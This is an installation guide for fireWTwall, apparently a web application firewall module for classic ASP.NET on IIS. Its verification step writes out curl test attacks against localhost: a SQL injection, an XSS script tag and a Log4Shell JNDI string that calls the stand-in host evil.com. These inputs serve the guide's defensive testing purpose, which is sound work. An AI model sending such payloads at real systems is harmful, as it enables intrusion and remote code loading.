# ASP.NET Installation

## Requirements

- .NET Framework **4.7.2** or later (targets classic ASP.NET Web Forms / MVC / WebAPI on IIS)
- IIS 7.5+ or IIS Express
- The `System.Web` and `System.Runtime.Caching` assemblies (included in .NET 4.7.2+)
- `System.Web.Extensions` assembly (`JavaScriptSerializer` — included in .NET 4.7.2+)

> fireWTwall runs as an **IHttpModule**, so it works with any ASP.NET Web Forms, MVC, or Web API project that runs on the classic System.Web pipeline — including `.aspx`, `.ashx`, `.asmx`, and Razor Views.

---

## Option A — Copy source files into your project (recommended)

This is the simplest approach. No NuGet package is needed.

1. Copy the `aspnet/src/` directory into your project (e.g. `App_Code/FireWTWall/` or a class library).
2. Ensure all `.cs` files are included in your project and target **Build Action: Compile**.
3. Register the module in `Web.config` (see below).

```
YourProject/
├── App_Code/                   ← or a separate class library
│   └── FireWTWall/
│       ├── DetectorResult.cs
│       ├── WafConfig.cs
│       ├── WafRequest.cs
│       ├── IpFilter.cs
│       ├── RateLimiter.cs
│       ├── WafLogger.cs
│       ├── WafResponse.cs
│       ├── DdosProtection.cs
│       ├── WAF.cs
│       ├── WafHttpModule.cs
│       └── detectors/
│           ├── SqlInjectionDetector.cs
│           ├── XssDetector.cs
│           └── ...
├── Web.config
└── Global.asax
```

---

## Option B — Add as a separate class library project

1. Add a new **Class Library (.NET Framework)** project (e.g. `FireWTWall`) to your solution.
2. Copy all `aspnet/src/` files into it.
3. Add a project reference from your web project to `FireWTWall`.
4. Register the module in `Web.config`.

---

## Register the HttpModule in Web.config

Add the following to your application's `Web.config`:

```xml
<configuration>

  <!-- IIS Integrated pipeline (recommended) -->
  <system.webServer>
    <modules>
      <add name="FireWTWallModule" type="FireWTWall.WafHttpModule" />
    </modules>
  </system.webServer>

  <!-- IIS Classic pipeline (legacy, only if you use it) -->
  <system.web>
    <httpModules>
      <add name="FireWTWallModule" type="FireWTWall.WafHttpModule" />
    </httpModules>
  </system.web>

</configuration>
```

Once registered, the WAF runs automatically **before every request** — `.aspx` pages, API controllers, handlers, and static files all pass through it.

---

## Protect the log directory

The WAF writes NDJSON logs to `App_Data/waf.log` by default. IIS serves `App_Data` with a 403 response by default, so no extra configuration is needed for the default path.

If you change `LogPath` to a custom directory, make sure it is **not** inside your web root, or add the following to its `Web.config`:

```xml
<configuration>
  <system.webServer>
    <security>
      <requestFiltering>
        <hiddenSegments>
          <add segment="logs" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

---

## Verify the installation

Start your application, then run:

```bash
# Clean request — should return 200
curl -i http://localhost/

# SQL injection — should return 403
curl -i "http://localhost/?q=1+UNION+SELECT+*+FROM+users"

# XSS — should return 403
curl -i "http://localhost/?q=<script>alert(1)</script>"

# Log4Shell (CVE-2021-44228) — should return 403
curl -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' -i http://localhost/
```

Blocked requests are logged to `App_Data/waf.log`.

---

## Remove server identification headers (recommended)

Add this to your `Web.config` to suppress IIS version headers:

```xml
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <remove name="X-Powered-By" />
      <remove name="X-AspNet-Version" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

fireWTwall also removes these from blocked responses automatically.
